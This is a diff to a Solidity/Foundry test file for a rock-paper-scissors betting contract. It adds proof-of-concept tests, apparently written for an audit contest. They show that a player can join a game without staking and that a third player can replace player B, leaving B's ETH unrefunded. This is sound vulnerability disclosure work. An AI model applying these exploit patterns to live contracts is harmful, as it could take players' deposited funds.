@@ -45,6 +45,7 @@ contract RockPaperScissorsTest is Test {
     address public admin;
     address public playerA;
     address public playerB;
+    address public playerC;
 
     // Test constants
     uint256 constant BET_AMOUNT = 0.1 ether;
@@ -54,16 +55,31 @@ contract RockPaperScissorsTest is Test {
     // Game ID for tests
     uint256 public gameId;
 
+    // Player balances
+    uint256 public playerAInitialBalance;
+    uint256 public playerANewBalance;
+    uint256 public playerBInitialBalance;
+    uint256 public playerBNewBalance;
+    uint256 public playerCInitialBalance;
+    uint256 public playerCNewBalance;
+
+    // Contract balances
+    uint256 public contractInitialBalance;
+    uint256 public contractNewBalance;
+    uint256 public contractFinalBalance;
+
     // Setup before each test
     function setUp() public {
         // Set up addresses
         admin = address(this);
         playerA = makeAddr("playerA");
         playerB = makeAddr("playerB");
+        playerC = makeAddr("playerC");  
 
         // Fund the players
         vm.deal(playerA, 10 ether);
         vm.deal(playerB, 10 ether);
+        vm.deal(playerC, 10 ether);
 
         // Deploy contracts
         game = new RockPaperScissors();
@@ -75,6 +91,9 @@ contract RockPaperScissorsTest is Test {
 
         vm.prank(address(game));
         token.mint(playerB, 10);
+
+        vm.prank(address(game));
+        token.mint(playerC, 10);
     }
 
     
@@ -129,6 +148,103 @@ contract RockPaperScissorsTest is Test {
         // console.log(address(game).balance);
         // console.log(address(reenter).balance);
         console.log(address(playerB).balance);
+    }
+
+    // Inconsistent Checks On game.bet val In joinGameWithEth Function Allows Player B To Join Game Without Staking
+    // https://codehawks.cyfrin.io/c/2025-04-rock-paper-scissors/s/3
+    // forge test --mt testJoinGameWithEthIsFlawed
+    function testJoinGameWithEthIsFlawed() public {
+        // player A creates game with token
+        uint256 playerATokenBefore = token.balanceOf(playerA);
+
+        vm.startPrank(playerA);
+        token.approve(address(game), 1);
+        gameId = game.createGameWithToken(TOTAL_TURNS, TIMEOUT);
+        vm.stopPrank();
+
+        uint256 playerABalanceAfter = token.balanceOf(playerA);
+
+        assertEq(playerATokenBefore - playerABalanceAfter, 1);
+
+        uint256 playerBBalanceBefore = token.balanceOf(playerB);
+
+        vm.startPrank(playerB);
+        game.joinGameWithEth{value: 0}(gameId);
+        vm.stopPrank();
+        
+        uint256 playerBBalanceAfter = token.balanceOf(playerB);
+
+        assertEq(playerBBalanceAfter, playerBBalanceBefore);
+
+        (address storedPlayerA, address storedPlayerB,,,,,,,,,,,,,, RockPaperScissors.GameState state) =
+            game.games(gameId);
+
+        assertEq(storedPlayerA, playerA);
+        assertEq(storedPlayerB, playerB);
+    }
+
+    function testJoinGameWithEthMalicious() public {
+        // Create a game
+        vm.prank(playerA);
+        playerAInitialBalance = playerA.balance;
+        contractInitialBalance = address(game).balance;
+        console.log("PlayerA Initial Balance: ", playerAInitialBalance);
+        console.log("Amount initially in game contract: ", contractInitialBalance);
+        gameId = game.createGameWithEth{value: BET_AMOUNT}(TOTAL_TURNS, TIMEOUT);
+
+        // Player B joins the game
+        vm.startPrank(playerB);
+        vm.expectEmit(true, true, false, true);
+        playerBInitialBalance = playerB.balance;
+        console.log("PlayerB Initial Balance: ", playerBInitialBalance);
+        emit PlayerJoined(gameId, playerB);
+
+        game.joinGameWithEth{value: BET_AMOUNT}(gameId);
+        vm.stopPrank();
+
+        // Player C joins the game, replacing original Player B
+        vm.startPrank(playerC);
+        vm.expectEmit(true, true, false, true);
+        playerCInitialBalance = playerC.balance;
+        console.log("PlayerC Initial Balance: ", playerCInitialBalance);
+        emit PlayerJoined(gameId, playerC);
+
+        game.joinGameWithEth{value: BET_AMOUNT}(gameId);
+        vm.stopPrank();
+
+        // Check amount in contract
+        contractNewBalance = address(game).balance;
+        console.log("Amount in game contract after player B leaves and player C joins: ", contractNewBalance);
+
+        // Verify game state
+        (address storedPlayerA, address storedPlayerB,,,,,,,,,,,,,, RockPaperScissors.GameState state) =
+            game.games(gameId);
+
+        // Player A cancels game to issue refund, but player B is not refunded
+        vm.startPrank(playerA);
+        game.cancelGame(gameId);
+        playerANewBalance = playerA.balance;
+        playerCNewBalance = playerC.balance;
+        playerBNewBalance = playerB.balance;
+        contractFinalBalance = address(game).balance;
+        console.log("playerA Final Balance: ", playerANewBalance);
+        console.log("playerC Final Balance: ", playerCNewBalance);
+        console.log("playerB Final Balance: ", playerBNewBalance);
+        console.log("Amount in game contract after game canceled: ", contractFinalBalance);
+        vm.stopPrank();
+
+        vm.startPrank(admin);
+        game.withdrawFees(contractFinalBalance);
+
+        // Assertions
+        assertEq(playerANewBalance, playerAInitialBalance, "Player A not refunded");
+        assertEq(playerBNewBalance, playerBInitialBalance, "Player B not refunded"); // Does not pass
+        assertEq(playerCNewBalance, playerCInitialBalance, "Player C not refunded");
+
+        assertEq(contractFinalBalance, 0, "Contract balance not zero after game canceled"); // Does not pass
+
+        assertEq(storedPlayerA, playerA, "Final player A address is not original address");
+        assertEq(storedPlayerB, playerB, "Final player B address is not original address"); // Does not pass
     }
 
     // ==================== GAME CREATION TESTS ====================
